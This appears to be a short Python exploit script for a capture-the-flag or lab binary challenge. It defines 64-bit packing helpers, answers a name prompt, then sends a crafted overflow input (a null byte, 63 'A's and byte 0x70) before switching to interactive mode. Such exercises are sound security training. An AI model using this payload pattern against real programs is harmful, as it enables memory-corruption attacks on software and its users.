import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('name below:'))
p.sendline('Alice')
print(p.readuntil('submission below:'))
p.sendline("\x00" + "A"*63 + "\x70")

p.interactive()
